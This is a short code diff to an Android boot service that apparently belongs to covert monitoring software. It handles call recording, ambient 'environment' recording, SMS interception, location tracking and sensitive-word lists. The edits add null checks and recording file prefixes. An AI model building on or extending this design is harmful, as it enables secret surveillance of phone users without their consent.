@@ -12,6 +12,7 @@ import system.service.feature.phonecall.PhoneCallCtrl;
 import system.service.feature.sms.SmsCtrl;
 import system.service.receiver.ScreenStateReceiver;
 import system.service.receiver.SmsReceiver;
+import system.service.task.GetInfoTask;
 
 import com.android.internal.telephony.ITelephony;
 import com.particle.inspector.common.util.DatetimeUtil;
@@ -47,13 +48,13 @@ public class BootService extends Service
 	
 	Context context;
 	
-	private Timer mGetInfoTimer;
-	private GetInfoTask mInfoTask;
+	private Timer mGetInfoTimer = null;
+	private GetInfoTask mInfoTask = null;
 	private final long mGetInfoDelay  = 10000; // 10 Seconds
 	private final long mGetInfoPeriod = 300000; // 300 Seconds
 	
 	public static LocationUtil locationUtil = null;
-	private TelephonyManager telManager;
+	private TelephonyManager telManager = null;
 	private boolean recordStarted = false;
 	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder = new MediaRecorder();
@@ -197,8 +198,8 @@ public class BootService extends Service
 		
 		this.context = getApplicationContext();
 		
-		mGetInfoTimer = new Timer();
-		mInfoTask = new GetInfoTask(context);
+		if (mGetInfoTimer == null) { mGetInfoTimer = new Timer(); }
+		if (mInfoTask == null) { mInfoTask = new GetInfoTask(context); }
 	}
 
 	@Override
@@ -217,6 +218,12 @@ public class BootService extends Service
 		
 		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
 			GlobalValues.sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
+		
+		if (GlobalValues.callRecordFilePrefix == null) 
+			GlobalValues.callRecordFilePrefix = context.getResources().getString(R.string.phonecall_record);
+		
+		if (GlobalValues.envRecordFilePrefix == null) 
+			GlobalValues.envRecordFilePrefix = context.getResources().getString(R.string.env_record);
 			
 		// ------------------------------------------------------------------			
 		// Start timers and listeners
@@ -238,10 +245,12 @@ public class BootService extends Service
 		}
 		
 		// Register screen_on intent broadcast receiver
+		/*
 		if (screenStateIntent == null) {
 			screenStateIntent = new IntentFilter(Intent.ACTION_SCREEN_ON);
 			this.registerReceiver(new ScreenStateReceiver(), screenStateIntent);
 		}
+		*/
 	}
 	
 	/*
